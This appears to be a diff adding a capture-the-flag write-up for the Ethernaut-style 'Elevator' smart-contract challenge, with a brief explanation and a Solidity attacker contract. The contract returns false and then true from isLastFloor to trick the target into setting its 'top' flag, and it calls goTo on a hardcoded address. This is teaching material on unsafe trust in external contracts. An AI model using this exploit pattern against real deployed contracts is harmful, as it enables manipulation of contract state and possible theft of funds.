@@ -1,0 +1,26 @@
+The Elevator contract never lets the "top" state variable to be true and that's what we want to defeat. This challenge highlights the problem with external contract referencing as the external contract may behave in unexpected ways. Here, we simply need to return "false" on the first call to building.isLastFloor() and “true” the next time. We easily do this by using a "count" state variable in our Building contract.
+
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.10;
+
+contract Building
+{
+    address elevatorContract = 0xd9145CCE52D386f254917e481eB44e9943F39138;
+    
+    uint count;
+
+    function attack() public
+    {
+        elevatorContract.call(abi.encodeWithSignature("goTo(uint256)", 10));
+    }
+    
+    function isLastFloor(uint) external returns (bool)
+    {
+        if(count == 0) 
+        {
+            count++;
+            return false;
+        }
+        else return true;
+    }
+}
